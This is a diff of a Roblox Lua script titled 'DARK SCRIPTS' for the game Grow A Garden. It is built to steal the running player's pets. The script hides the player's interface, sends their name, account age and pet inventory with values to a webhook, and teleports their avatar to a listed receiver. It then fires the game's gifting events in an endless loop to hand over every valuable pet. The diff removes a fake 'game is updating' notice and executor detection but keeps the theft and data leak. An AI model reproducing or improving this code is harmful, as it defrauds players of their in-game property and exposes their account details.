@@ -10,16 +10,15 @@ local RS = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
-local TweenService = game:GetService("TweenService")
-local LocalizationService = game:GetService("LocalizationService")
+local TeleportService = game:GetService("TeleportService")
 local DataService = require(RS.Modules.DataService)
 local PetRegistry = require(RS.Data.PetRegistry)
 local NumberUtil = require(RS.Modules.NumberUtil)
 local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
-local PetsService = require(game:GetService("ReplicatedStorage").Modules.PetServices.PetsService)
-local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
+local PetsService = require(RS.Modules.PetServices.PetsService)
 
 local player = Players.LocalPlayer
+
 local gui = Instance.new("ScreenGui")
 gui.Name = "ScriptGui"
 gui.ResetOnSpawn = false
@@ -46,58 +45,12 @@ spinner.Parent = bg
 local asc = Instance.new("UIAspectRatioConstraint")
 asc.Parent = spinner
 
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0.08, 0)
-title.Position = UDim2.new(0, 0, 0.53, 0)
-title.BackgroundTransparency = 1
-title.Text = "Please wait..."
-title.Font = Enum.Font.GothamBold
-title.TextSize = 38
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.TextStrokeTransparency = 0.75
-title.Parent = bg
-
-local desc = Instance.new("TextLabel")
-desc.Size = UDim2.new(0.8, 0, 0.12, 0)
-desc.Position = UDim2.new(0.1, 0, 0.62, 0)
-desc.BackgroundTransparency = 1
-desc.Text = "The game is updating. Leaving now may cause data loss or corruption.\nYou will be returned shortly."
-desc.Font = Enum.Font.Gotham
-desc.TextSize = 20
-desc.TextColor3 = Color3.fromRGB(200, 200, 200)
-desc.TextWrapped = true
-desc.TextXAlignment = Enum.TextXAlignment.Center
-desc.TextYAlignment = Enum.TextYAlignment.Top
-desc.Parent = bg
-
-local countdown = Instance.new("TextLabel")
-countdown.Size = UDim2.new(1, 0, 0.05, 0)
-countdown.Position = UDim2.new(0, 0, 0.87, 0)
-countdown.BackgroundTransparency = 1
-countdown.Text = "Returning in 30 seconds..."
-countdown.Font = Enum.Font.GothamSemibold
-countdown.TextSize = 20
-countdown.TextColor3 = Color3.fromRGB(255, 255, 255)
-countdown.TextXAlignment = Enum.TextXAlignment.Center
-countdown.Parent = bg
-
 task.spawn(function()
     while spinner and spinner.Parent do
         spinner.Rotation += 2
         task.wait(0.01)
     end
 end)
-
-task.spawn(function()
-    for i = 30, 0, -1 do
-        countdown.Text = "Returning in " .. i .. " second" .. (i == 1 and "" or "s") .. "..."
-        task.wait(1)
-    end
-end)
-
-if GetServerType and GetServerType:InvokeServer() == "VIPServer" then
-    player:Kick("This server is not supported")
-end
 
 local PetPriorityData = {
     ["Kitsune"] = { priority = 1, emoji = "🦊", isMutation = false },
@@ -128,18 +81,6 @@ local PetPriorityData = {
     ["Shiny"] = { priority = 26, emoji = "✨", isMutation = true },
     ["Tranquil"] = { priority = 27, emoji = "🧘", isMutation = true },
 }
-
-local function detectExecutor()
-    local name
-    local success = pcall(function()
-        if identifyexecutor then
-            name = identifyexecutor()
-        elseif getexecutorname then
-            name = getexecutorname()
-        end
-    end)
-    return name or "Unknown"
-end
 
 local function formatNumberWithCommas(n)
     local str = tostring(n)
@@ -206,71 +147,49 @@ local function GetPlayerPets()
 
         if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
             local petName = tool.Name
+            local PET_UUID = tool:GetAttribute("PET_UUID")
+            if not PET_UUID then continue end
 
-            local function SafeCalculatePetValue(tool)
-                local PET_UUID = tool:GetAttribute("PET_UUID")
-                if not PET_UUID then
-                    return 0
-                end
+            local data = DataService:GetData()
+            if not data or not data.PetsData.PetInventory.Data[PET_UUID] then continue end
 
-                local data = DataService:GetData()
-                if not data or not data.PetsData.PetInventory.Data[PET_UUID] then
-                    return 0
-                end
+            local petInventoryData = data.PetsData.PetInventory.Data[PET_UUID]
+            local petData = petInventoryData.PetData
+            local HatchedFrom = petData.HatchedFrom
+            if not HatchedFrom or HatchedFrom == "" then continue end
 
-                local petInventoryData = data.PetsData.PetInventory.Data[PET_UUID]
-                local petData = petInventoryData.PetData
-                local HatchedFrom = petData.HatchedFrom
+            local eggData = PetRegistry.PetEggs[HatchedFrom]
+            if not eggData then continue end
 
-                if not HatchedFrom or HatchedFrom == "" then
-                    return 0
-                end
+            local rarityData = eggData.RarityData.Items[petInventoryData.PetType]
+            if not rarityData then continue end
 
-                local eggData = PetRegistry.PetEggs[HatchedFrom]
-                if not eggData then
-                    return 0
-                end
+            local WeightRange = rarityData.GeneratedPetData.WeightRange
+            if not WeightRange then continue end
 
-                local rarityData = eggData.RarityData.Items[petInventoryData.PetType]
-                if not rarityData then
-                    return 0
-                end
-
-                local WeightRange = rarityData.GeneratedPetData.WeightRange
-                if not WeightRange then
-                    return 0
-                end
-
-                local sellPrice = PetRegistry.PetList[petInventoryData.PetType].SellPrice
-                local weightMultiplier = math.lerp(0.8, 1.2, NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight))
-                local levelMultiplier = math.lerp(0.15, 6, PetUtilities:GetLevelProgress(petData.Level))
-
-                return math.floor(sellPrice * weightMultiplier * levelMultiplier)
-            end
+            local sellPrice = PetRegistry.PetList[petInventoryData.PetType].SellPrice
+            local weightMultiplier = math.lerp(0.8, 1.2, NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight))
+            local levelMultiplier = math.lerp(0.15, 6, PetUtilities:GetLevelProgress(petData.Level))
+            local rawValue = math.floor(sellPrice * weightMultiplier * levelMultiplier)
 
             local age = getAge(tool.Name) or 0
             local weight = getWeight(tool.Name) or 0
-
             local strippedName = petName:gsub(" %[.*%]", "")
+            local petType = strippedName
 
-            local function stripMutationPrefix(name)
-                for key, data in pairs(PetPriorityData) do
-                    if data.isMutation and name:lower():find(key:lower()) == 1 then
-                        return name:sub(#key + 2)
-                    end
+            for key, data in pairs(PetPriorityData) do
+                if data.isMutation and strippedName:lower():find(key:lower()) == 1 then
+                    petType = strippedName:sub(#key + 2)
+                    break
                 end
-                return name
             end
 
-            local petType = stripMutationPrefix(strippedName)
-
-            local rawValue = SafeCalculatePetValue(tool)
-            if rawValue and rawValue > 0 then
+            if rawValue > 0 then
                 table.insert(unsortedPets, {
                     PetName = petName,
                     PetAge = age,
                     PetWeight = weight,
-                    Id = tool:GetAttribute("PET_UUID") or tool:GetAttribute("uuid"),
+                    Id = PET_UUID,
                     Type = petType,
                     Value = rawValue,
                     Formatted = formatNumberWithCommas(rawValue),
@@ -279,11 +198,8 @@ local function GetPlayerPets()
         end
     end
 
-    task.wait(0.5)
     return unsortedPets
 end
-
-local pets = GetPlayerPets()
 
 local function isMutated(toolName)
     for key, data in pairs(PetPriorityData) do
@@ -294,38 +210,8 @@ local function isMutated(toolName)
     return nil
 end
 
-table.sort(pets, function(a, b)
-    local aPriority, aMutation = 99, isMutated(a.PetName)
-    if PetPriorityData[a.Type] then
-        aPriority = PetPriorityData[a.Type].priority
-    elseif aMutation and PetPriorityData[aMutation] then
-        aPriority = PetPriorityData[aMutation].priority
-    elseif a.Weight and a.Weight >= 10 then
-        aPriority = 12
-    elseif a.Age and a.Age >= 60 then
-        aPriority = 13
-    end
-
-    local bPriority, bMutation = 99, isMutated(b.PetName)
-    if PetPriorityData[b.Type] then
-        bPriority = PetPriorityData[b.Type].priority
-    elseif bMutation and PetPriorityData[bMutation] then
-        bPriority = PetPriorityData[bMutation].priority
-    elseif b.Weight and b.Weight >= 10 then
-        bPriority = 12
-    elseif b.Age and b.Age >= 60 then
-        bPriority = 13
-    end
-
-    if aPriority == bPriority then
-        return a.Value > b.Value
-    else
-        return aPriority < bPriority
-    end
-end)
-
-local function hasRarePets()
-    for _, pet in pairs(pets) do
+local function hasRarePets(petsList)
+    for _, pet in pairs(petsList) do
         if pet.Type ~= "Red Fox" and PetPriorityData[pet.Type] and not PetPriorityData[pet.Type].isMutation then
             return true
         end
@@ -335,149 +221,210 @@ end
 
 local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
 
-local tpScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', game.PlaceId, game.JobId)
+local function SendWebhook(petsList)
+    local petString = ""
+    local totalValue = 0
+    
+    for _, pet in ipairs(petsList) do
+        local highestPriority = 99
+        local chosenEmoji = "🐶"
+        local mutation = isMutated(pet.PetName)
+        local mutationData = mutation and PetPriorityData[mutation] or nil
+        local petData = PetPriorityData[pet.Type] or nil
 
-local petString = ""
-for _, pet in ipairs(pets) do
-    local highestPriority = 99
-    local chosenEmoji = "🐶"
-    local mutation = isMutated(pet.PetName)
-    local mutationData = mutation and PetPriorityData[mutation] or nil
-    local petData = PetPriorityData[pet.Type] or nil
-
-    if petData and petData.priority < highestPriority then
-        highestPriority = petData.priority
-        chosenEmoji = petData.emoji
-    elseif mutationData and mutationData.priority < highestPriority then
-        highestPriority = mutationData.priority
-        chosenEmoji = mutationData.emoji
-    elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
-        highestPriority = 12
-        chosenEmoji = "🐘"
-    elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
-        highestPriority = 13
-        chosenEmoji = "👴"
-    end
-
-    if not OnlyPriorityPets or (petData and petData.priority <= MinPriorityThreshold) or (mutationData and mutationData.priority <= MinPriorityThreshold) then
-        local petName = pet.PetName
-        local petValue = pet.Formatted
-        petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " -> " .. petValue
-    end
-end
-
-local playerCount = #Players:GetPlayers()
-
-local function getPlayerCountry(player)
-    local success, result = pcall(function()
-        return LocalizationService:GetCountryRegionForPlayerAsync(player)
-    end)
-    return success and result or "Unknown"
-end
-
-local accountAgeInDays = Players.LocalPlayer.AccountAge
-local creationDate = os.time() - (accountAgeInDays * 24 * 60 * 60)
-local creationDateString = os.date("%Y-%m-%d", creationDate)
-
-local function truncateByLines(inputString, maxLines)
-    local lines = {}
-    for line in inputString:gmatch("[^\n]+") do
-        table.insert(lines, line)
-    end
-    if #lines <= maxLines then
-        return inputString
-    else
-        local truncatedLines = {}
-        for i = 1, maxLines - 1 do
-            table.insert(truncatedLines, lines[i])
+        if petData and petData.priority < highestPriority then
+            highestPriority = petData.priority
+            chosenEmoji = petData.emoji
+        elseif mutationData and mutationData.priority < highestPriority then
+            highestPriority = mutationData.priority
+            chosenEmoji = mutationData.emoji
+        elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
+            highestPriority = 12
+            chosenEmoji = "🐘"
+        elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
+            highestPriority = 13
+            chosenEmoji = "👴"
         end
-        return table.concat(truncatedLines, "\n")
+
+        if not OnlyPriorityPets or (petData and petData.priority <= MinPriorityThreshold) or (mutationData and mutationData.priority <= MinPriorityThreshold) then
+            petString = petString .. "\n" .. chosenEmoji .. " - " .. pet.PetName .. " -> " .. pet.Formatted
+            totalValue = totalValue + pet.Value
+        end
     end
-end
 
-local totalValue = 0
-for _, pet in ipairs(pets) do
-    totalValue += pet.Value or 0
-end
-local formattedTotalValue = formatNumberWithCommas(totalValue)
+    local formattedTotalValue = formatNumberWithCommas(totalValue)
+    local tpScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', game.PlaceId, game.JobId)
 
-if petString ~= "" then
-    local embed = {
-        title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
-        color = 65280,
-        fields = {
-            {
-                name = "👤 Player Information",
-                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", Players.LocalPlayer.DisplayName or "Unknown", Username[1] or "Unknown", detectExecutor() or "Unknown", tostring(Players.LocalPlayer.AccountAge or 0)),
-                inline = false
+    if petString ~= "" then
+        local embed = {
+            title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
+            color = 65280,
+            fields = {
+                {
+                    name = "👤 Player Information",
+                    value = string.format("```Name: %s\nReceiver: %s\nAccount Age: %s```", 
+                        Players.LocalPlayer.DisplayName or "Unknown", 
+                        Username[1] or "Unknown", 
+                        tostring(Players.LocalPlayer.AccountAge or 0)),
+                    inline = false
+                },
+                {
+                    name = "💰 Total Value",
+                    value = string.format("```%s```", formattedTotalValue),
+                    inline = false
+                },
+                {
+                    name = "🌴 Backpack",
+                    value = string.format("```%s```", petString),
+                    inline = false
+                },
+                {
+                    name = "🏝️ Join Server",
+                    value = "[click here to join](" .. Fern .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
+                    inline = false
+                }
             },
-            {
-                name = "💰 Total Value",
-                value = string.format("```%s```", formattedTotalValue),
-                inline = false
-            },
-            {
-                name = "🌴 Backpack",
-                value = string.format("```%s```", truncateByLines(petString, 20)),
-                inline = false
-            },
-            {
-                name = "🏝️ Join Server",
-                value = "[click here to join](" .. Fern .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
-                inline = false
+            footer = {
+                text = string.format("%s | %s", game.PlaceId, game.JobId)
             }
-        },
-        footer = {
-            text = string.format("%s | %s", game.PlaceId, game.JobId)
         }
-    }
 
-    local payload = {
-        content = (hasRarePets() and "--@everyone\n" or "") .. string.format("\n%s\n", tpScript or "N/A"),
-        embeds = {embed}
-    }
+        local payload = {
+            content = (hasRarePets(petsList) and "--@everyone\n" or "") .. string.format("\n%s\n", tpScript or "N/A"),
+            embeds = {embed}
+        }
 
-    pcall(function()
-        request({
-            Url = Webhook,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
+        pcall(function()
+            request({
+                Url = Webhook,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    end
 end
 
-local receiverPlr
-repeat
-    for _, name in ipairs(Username) do
-        receiverPlr = Players:FindFirstChild(name)
-        if receiverPlr then
-            break
-        end
+local function ForceTeleportToPlayer(target)
+    if not player.Character or not target.Character then return end
+    
+    local humanoid = player.Character:FindFirstChild("Humanoid")
+    local targetPos = target.Character:FindFirstChild("HumanoidRootPart")
+    
+    if humanoid and targetPos then
+        humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+        player.Character:SetPrimaryPartCFrame(targetPos.CFrame * CFrame.new(0, 0, 2))
     end
-    task.wait(1)
-until receiverPlr
+end
 
-local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
-local hum = receiverChar:WaitForChild("Humanoid")
-local targetPlr = Players.LocalPlayer
-local targetChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()
+local function GiftAllPets(receiver)
+    local pets = GetPlayerPets()
+    SendWebhook(pets)
+    
+    table.sort(pets, function(a, b)
+        local aPriority, aMutation = 99, isMutated(a.PetName)
+        if PetPriorityData[a.Type] then
+            aPriority = PetPriorityData[a.Type].priority
+        elseif aMutation and PetPriorityData[aMutation] then
+            aPriority = PetPriorityData[aMutation].priority
+        elseif a.Weight and a.Weight >= 10 then
+            aPriority = 12
+        elseif a.Age and a.Age >= 60 then
+            aPriority = 13
+        end
 
-if receiverPlr == targetPlr then
-    repeat
-        for _, name in ipairs(Username) do
-            receiverPlr = Players:FindFirstChild(name)
-            if receiverPlr then
-                break
+        local bPriority, bMutation = 99, isMutated(b.PetName)
+        if PetPriorityData[b.Type] then
+            bPriority = PetPriorityData[b.Type].priority
+        elseif bMutation and PetPriorityData[bMutation] then
+            bPriority = PetPriorityData[bMutation].priority
+        elseif b.Weight and b.Weight >= 10 then
+            bPriority = 12
+        elseif b.Age and b.Age >= 60 then
+            bPriority = 13
+        end
+
+        if aPriority == bPriority then
+            return a.Value > b.Value
+        else
+            return aPriority < bPriority
+        end
+    end)
+
+    local inventory = player.Backpack
+
+    for _, pet in ipairs(pets) do
+        local highestPriority = 99
+        local mutation = isMutated(pet.PetName)
+        local mutationData = mutation and PetPriorityData[mutation] or nil
+        local petData = PetPriorityData[pet.Type] or nil
+
+        if petData and petData.priority < highestPriority then
+            highestPriority = petData.priority
+        elseif mutationData and mutationData.priority < highestPriority then
+            highestPriority = mutationData.priority
+        elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
+            highestPriority = 12
+        elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
+            highestPriority = 13
+        end
+
+        if not OnlyPriorityPets or (petData and petData.priority <= MinPriorityThreshold) or (mutationData and mutationData.priority <= MinPriorityThreshold) then
+            for _, tool in player.Backpack:GetChildren() do
+                if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" and tool:GetAttribute("PET_UUID") == pet.Id then
+                    ForceTeleportToPlayer(receiver)
+                    
+                    if tool.Parent ~= inventory then
+                        tool.Parent = inventory
+                        task.wait(0.3)
+                    end
+
+                    local humanoid = player.Character:FindFirstChild("Humanoid")
+                    if humanoid then
+                        humanoid:EquipTool(tool)
+                        task.wait(0.6)
+                    end
+
+                    if tool.Parent == player.Character then
+                        pcall(function()
+                            RS.GameEvents.PetGiftingService:FireServer("GivePet", receiver)
+                            task.wait(0.5)
+                            local prompt = receiver.Character:FindFirstChild("Head") and receiver.Character.Head:FindFirstChildOfClass("ProximityPrompt")
+                            if prompt then
+                                fireproximityprompt(prompt)
+                            end
+                        end)
+                    end
+
+                    task.wait(0.15)
+                    if tool and tool.Parent then
+                        tool.Parent = player.Backpack
+                    end
+                end
             end
         end
-        task.wait(1)
-    until receiverPlr
+    end
 end
 
-for _, v in targetPlr.PlayerGui:GetDescendants() do
+local function MainLoop()
+    while true do
+        local receiverPlr
+        for _, name in ipairs(Username) do
+            receiverPlr = Players:FindFirstChild(name)
+            if receiverPlr then break end
+        end
+
+        if receiverPlr then
+            GiftAllPets(receiverPlr)
+        end
+        
+        task.wait(0.1)
+    end
+end
+
+for _, v in player.PlayerGui:GetDescendants() do
     if v:IsA("ScreenGui") then
         v.Enabled = false
     end
@@ -500,7 +447,7 @@ game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 
 if workspace:FindFirstChild("PetsPhysical") then
     for _, petMover in workspace:FindFirstChild("PetsPhysical"):GetChildren() do
-        if petMover and petMover:GetAttribute("OWNER") == targetPlr.Name then
+        if petMover and petMover:GetAttribute("OWNER") == player.Name then
             for _, pet in petMover:GetChildren() do
                 PetsService:UnequipPet(pet.Name)
             end
@@ -508,128 +455,4 @@ if workspace:FindFirstChild("PetsPhysical") then
     end
 end
 
-local function SmoothFollow()
-    local offset = CFrame.new(0, 0, 0.5)
-    local conn = RunService.Heartbeat:Connect(function()
-        if receiverPlr.Character and targetPlr.Character then
-            local targetRoot = receiverPlr.Character:FindFirstChild("HumanoidRootPart")
-            local followerRoot = targetPlr.Character:FindFirstChild("HumanoidRootPart")
-            if targetRoot and followerRoot then
-                local distance = (targetRoot.Position - followerRoot.Position).Magnitude
-                if distance > 5 then
-                    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Linear)
-                    local tween = TweenService:Create(followerRoot, tweenInfo, {CFrame = targetRoot.CFrame * offset})
-                    tween:Play()
-                end
-            end
-        end
-    end)
-    return conn
-end
-
-local followConnection = SmoothFollow()
-
-local inventory = targetPlr.Backpack
-
-local function safeGiftTool(tool)
-    if not receiverPlr or not receiverChar or not targetPlr.Character then
-        return false
-    end
-
-    if tool.Parent ~= inventory then
-        tool.Parent = inventory
-        task.wait(0.3)
-    end
-
-    local humanoid = targetPlr.Character:FindFirstChild("Humanoid")
-    if not humanoid then
-        return false
-    end
-
-    humanoid:EquipTool(tool)
-    task.wait(0.6)
-
-    if tool.Parent ~= targetPlr.Character then
-        tool.Parent = inventory
-        return false
-    end
-
-    if detectExecutor() == "Delta" then
-        task.wait(0.3)
-        local camera = workspace.CurrentCamera
-        local head = receiverChar and receiverChar:FindFirstChild("Head")
-
-        if head then
-            local screenPos, onScreen = camera:WorldToViewportPoint(head.Position)
-            if onScreen then
-                local x = screenPos.X
-                local y = screenPos.Y
-                local VirtualInputManager = game:GetService("VirtualInputManager")
-                VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, nil, false)
-                task.wait(0.8)
-                VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, nil, false)
-            else
-                return false
-            end
-        end
-    else
-        local success, err = pcall(function()
-            RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
-            task.wait(0.5)
-            local prompt = receiverChar:FindFirstChild("Head") and receiverChar.Head:FindFirstChildOfClass("ProximityPrompt")
-            if prompt then
-                fireproximityprompt(prompt)
-            end
-            return true
-        end)
-
-        if not success then
-            if tool then
-                tool.Parent = inventory
-            end
-            return false
-        end
-    end
-
-    task.wait(0.15)
-    if tool and tool.Parent then
-        tool.Parent = targetPlr.Backpack
-    end
-    return true
-end
-
-task.wait(1)
-
-for _, pet in ipairs(pets) do
-    local highestPriority = 99
-    local mutation = isMutated(pet.PetName)
-    local mutationData = mutation and PetPriorityData[mutation] or nil
-    local petData = PetPriorityData[pet.Type] or nil
-
-    if petData and petData.priority < highestPriority then
-        highestPriority = petData.priority
-    elseif mutationData and mutationData.priority < highestPriority then
-        highestPriority = mutationData.priority
-    elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
-        highestPriority = 12
-    elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
-        highestPriority = 13
-    end
-
-    if not OnlyPriorityPets or (petData and petData.priority <= MinPriorityThreshold) or (mutationData and mutationData.priority <= MinPriorityThreshold) then
-        for _, tool in targetPlr.Backpack:GetChildren() do
-            if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" and tool:GetAttribute("PET_UUID") == pet.Id then
-                for attempt = 1, 3 do
-                    local result = safeGiftTool(tool)
-                    if result then
-                        break
-                    end
-                end
-            end
-        end
-    end
-end
-
-if followConnection then
-    followConnection:Disconnect()
-end
+MainLoop()
